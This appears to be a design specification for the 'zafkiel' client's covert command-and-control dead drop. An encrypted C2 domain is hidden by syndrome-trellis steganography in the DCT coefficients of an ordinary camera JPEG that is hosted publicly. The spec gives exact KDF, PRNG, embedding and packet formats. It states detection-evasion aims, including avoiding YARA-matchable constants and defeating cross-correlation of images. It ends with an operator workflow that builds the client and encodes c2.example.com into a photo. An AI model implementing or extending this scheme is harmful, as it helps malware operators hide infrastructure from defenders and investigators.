# Dead-drop watermark specification (STC / DCT coefficient domain)

RFC-style contract between the zafkiel client (`src/client_stego.zig`,
`src/client_stc.zig`), the operator encoder (`tools/prng_stego.py`,
`tools/stego.py`, `tools/stc.py`) and the image codec (`src/jpeg.zig` in this
repository).

Every value below is canonical.  If two implementations disagree on any
constant, order or formula, the golden vectors
(`src/client_stc_golden.zig`, `src/client_stego_golden.zig`,
`src/oracle_*.zig`, `src/fixtures/*.jpg`) are the arbiter.

---

## 1. Security model

Kerckhoffs principle: **every algorithm and constant in this document is
public.**  Secrecy rests entirely on the 16-byte `stego_secret`.

- An analyst who knows all algorithms but not `stego_secret` cannot locate
  the payload (keyed permutation via `seed_p`), cannot verify its presence,
  and cannot decrypt it (ChaCha20-Poly1305 keyed via HKDF).
- With `stego_secret` public, any carrier-modifying scheme is
  information-theoretically detectable; that is a hard bound, not an
  engineering choice.  Do not claim otherwise.
- The watermark lives in the **quantized DCT coefficient** domain, which is
  what a JPEG re-encode at equal or higher quality preserves.  Spatial LSB
  embedding would be destroyed by any lossy re-compression; this scheme is
  not.
- Statistical stealth: syndrome-trellis coding places flips on
  low-distortion (high-magnitude) coefficients, minimising the deviation
  from the natural coefficient histogram.  It is not a guarantee against
  dedicated ML steganalysis; it is a best-effort minimisation.

## 2. Carrier contract (JPEG)

The codec (`jpeg.zig`) decodes baseline JPEG (SOF0) entropy only and emits:

```
carriers: []u8      // Y quantized AC magnitudes, block-major
width    = blocks_x // DCT blocks across (Y)
height   = blocks_y // DCT blocks down (Y)
bpp      = 31       // zig-zag AC positions 1..32
salt_material / salt_material_len // EXIF-derived material, see §8
```

Per block `b = by*blocks_x + bx` and band offset `z-1` (z in 1..32):

```
slot       = (by*blocks_x + bx)*31 + (z-1)
magnitude  = |coef[zigzag position z]|
carriers[slot] = magnitude  if 2 <= magnitude <= 254
               = 0          otherwise (placeholder, never a candidate)
```

The candidate set (`2 <= v <= 254`) is **invariant** under the allowed
`+/-1` flips, because:

- flips never move a magnitude outside `[2,254]` (F5 non-shrinkability), and
- flips never change `v & ENERGY_MASK` (`ENERGY_MASK = 0xFC`), so the
  block-energy ranking is stable (see §5).  This is enforced by the cost
  model (§6).

## 3. KDF (HKDF-SHA256)

```
ctx   = HMAC-SHA256(key = stego_secret, msg = 0x02)[0..16]   // keyed domain label
PRK   = HKDF-Extract(salt = derived_salt,  IKM = stego_secret)
OKM   = HKDF-Expand(PRK, info = ctx,  length = 64)
key     = OKM[0..32)    // ChaCha20-Poly1305
seed_p  = OKM[32..64)   // Xoshiro256 permutation seed
```

- `stego_secret` is 16 bytes, from `-Dstego_secret` (client) /
  `--stego-secret` (operator).  It is independent of `obf_key`.
- The HKDF `info` is a **keyed domain-separation context** (single-byte tag
  selector `0x02`) rather than a fixed string — no campaign-wide constant
  exists to YARA for.  Tags: `0x01` dead-drop salt, `0x02` stego KDF,
  `0x03` directive KDF.  Mirrors `client_stego.zig: deriveContext` /
  `tools/exif_tool.py: derive_context` (locked by
  `tools/gen_label_golden.py`).
- The salt is *derived* from the cover's own EXIF material (see §8); its
  role is KDF domain separation and anti-tampering (packet salt must equal
  it).  It is public, never secret.

## 4. PRNG budget

A single Xoshiro256** stream is seeded from `seed_p`:

```
words = [LE64(seed_p[0..8]), LE64(seed_p[8..16]),
         LE64(seed_p[16..24]), LE64(seed_p[24..32])]
any zero word -> 1
```

The stream is consumed **exactly once, in this order**, and identically on
both sides:

```
positions = generate_unique_positions(prng, 1792, len(candidates))
cover[i]  = carriers[candidates[positions[i]]] & 1      // i in 0..1791
```

`generate_unique_positions` is rejection sampling with a seen-set:
`pos = prng.next() % max`, skip repeats.  `1792 = 2 * 896` (rate-1/2 STC).

## 5. Adaptive candidate selection

`candidates` is the ordered list of carrier slot indices:

1. For each DCT cell `(cy, cx)` (block-major), base offset
   `cell*bpp` with `bpp = 31`:
   ```
   energy[cell] += |v & 0xFC - vr & 0xFC|   if cx+1 < blocks_x   (right)
   energy[cell] += |v & 0xFC - vd & 0xFC|   if cy+1 < blocks_y   (down)
   ```
   summed over the 31 band slots.
2. Rank cells by energy **descending**, tie-break by cell index ascending.
3. Active = top `ceil(35%)` of cells (at least 1).
4. Walk cells block-major; for each band slot, if
   `2 <= value <= 254`, append the slot index.

## 6. STC (Syndrome-Trellis Codes)

Parameters (public, from Filler, Judas & Fridrich, IEEE TIFS 6(3), 2011):

```
stcode   = [71, 109]     // submatrix columns, rate 1/2
N_BITS   = 7             // constraint height -> 128 trellis states
M        = 2             // columns per message block
message  = 896 bits      // the AEAD packet, LSB-first per byte
cover    = 1792 bits     // 2 per message bit
```

**Decoder** (client side; `client_stc.zig: extractSyndrome`): walk columns
0..1791; for every set cover bit, `acc ^= stcode[i % M]`; after every block
(`i % M == M-1`) emit `acc & 1` as a message bit, then `acc >>= 1`.

**Encoder** (operator side; `tools/stc.py`): Viterbi over the 128-state
trellis minimising `sum(cost)` with **asymmetric** per-bit costs:

```
cost of forcing bit to 0/1 = 0                        if it already is that
                           = min(1/|coef'|) over valid bucket-preserving
                             neighbours coef' in [2,254] with the target
                             parity, else +infinity
```

A neighbour is *bucket-preserving* iff `coef' & 0xFC == coef & 0xFC`.
The encoder modifies only the magnitudes selected by the trellis, via the
cheapest valid neighbour (`apply_flip`).

## 7. Packet (AEAD)

```
[0..4)   version  = 2                (big-endian u32)
[4..20)  salt     = 16 bytes          (must equal the derived salt, §8)
[20..32) nonce    = 12 bytes
[32..96) ciphertext (ChaCha20-Poly1305, AAD = "")
[96..112) tag     = 16 bytes
```

Plaintext (64 bytes): `[0] = domain length (1..59)`,
`[1..len] = domain bytes`, rest zero.  Decryption failures
(`InvalidPacketTag`, `SaltMetadataMismatch`, `UnsupportedPacketVersion`) all
abort resolution (client falls back to the built-in host).

## 8. Salt material (EXIF-derived; zero cover modification)

The dead-drop image is **never modified** beyond the embedded DCT watermark.
The salt is *derived* from the cover's own EXIF fields — the ones every real
camera writes — so an unkeyed observer cannot distinguish a dead-drop image
from any other photo, and there is no fixed metadata signature anywhere.

```
material = Make || '\0' || Model || '\0' || DateTimeOriginal || '\0'
           || SubsecTimeOriginal || '\0' || <SOF width> || 'x' || <SOF height>
ctx_salt = HMAC-SHA256(key = stego_secret[16B], msg = 0x01)[0:16]
salt     = HMAC-SHA256(key = stego_secret[16B], msg = ctx_salt + material)[0:16]
```

- Required EXIF fields (fail-closed on both sides — missing any ⇒ no
  material ⇒ resolution fails):
  - IFD0: `Make` (0x010F), `Model` (0x0110)
  - EXIF sub-IFD: `DateTimeOriginal` (0x9003), `SubsecTimeOriginal` (0x9291)
- Dimensions come from the baseline SOF0 frame (pixels), identical on the
  Python side (`PIL` reads the stored SOF dims; no orientation handling).
- TIFF byte order: both `II` (little-endian, e.g. Canon) and `MM`
  (big-endian, e.g. Huawei) are supported.
- ASCII values are read per the TIFF spec (inline when `count <= 4`, else at
  the stored offset) with trailing NULs/spaces stripped.
- Anti-tampering is preserved: the AEAD packet salt (§7) must equal the
  derived salt — altering or stripping any of the four EXIF fields changes
  the material and breaks extraction (`SaltMetadataMismatch`).
- The salt is a pure function of `(photo, stego_secret)`: re-encoding the
  same cover reproduces the same salt; different photos (different
  `DateTimeOriginal`/`SubsecTimeOriginal`) produce different salts, so
  dead-drop images cannot be cross-correlated.
- Edge case (accepted, documented in `docs/operations.md`): two photos taken
  on the same device in the same second with the same sub-second value share
  a salt.  The salt is not secret (Kerckhoffs), so this only affects KDF
  domain separation for those images.

The Python mirror is `tools/exif_tool.py`; the Zig parser is `src/exif.zig`;
`decodeJpeg` returns the canonical material in `Decoded.salt_material`
(`salt_material_len == 0` when no material is recoverable) and the client
performs the keyed HMAC derivation.

## 9. Cross-language alignment & golden vectors

Regenerate all fixtures deterministically:

```
python tools/gen_jpeg_fixtures.py   # libjpeg oracle (this repo)
python tools/gen_stc_golden.py      # bit-level STC vectors
python tools/gen_stego_golden.py    # full stego pipeline vectors
python tools/gen_e2e_fixture.py     # libjpeg encoder -> Zig decoder e2e
```

Committed golden files are the source of truth for any refactor of the
encoder or decoder.  `gen_jpeg_fixtures.py` lives in this repository;
the other generators live in the zafkiel `tools/` directory.  The e2e
fixture's `SALT_HEX` locks the Python↔Zig material/salt derivation.

## 10. Operator workflow

The `stego_secret` must be **pinned** and shared:

1. Build a dead-drop client with a fixed secret:
   `zig build -Dobf_key=<hex> -Dstego_secret=<hex> ...`
2. Encode the C2 image (cover MUST be a real camera photo whose EXIF has the
   four required fields; the encoder rejects anything else):
   `python tools/prng_stego.py --stego-secret <hex> encode cover.jpg c2.example.com out.jpg`
3. Host `out.jpg`; the client's resolver URL points at it.  The output keeps
   the cover's EXIF and vendor APP segments byte-for-byte.

CI builds randomise `stego_secret` per build — such binaries cannot decode
operator-created dead-drop images (by design; the secret is the only key).
Use a pinned secret for dead-drop deployments.

## 11. Compression resistance

- Embedded in **quantized** coefficients → survives re-encode at the same
  or a higher quality factor (coefficients are preserved bit-exact).
- Band [1..32] avoids DC (most fragile) and the highest frequencies (zeroed
  at low quality).
- `|coef| >= 2` and mid/high magnitudes preferred by the cost model → the
  flips sit on coefficients large enough to survive mild re-quantisation.
- At a lower re-encode quality the syndrome may corrupt; this is the
  documented limit of the scheme (no FEC is applied).
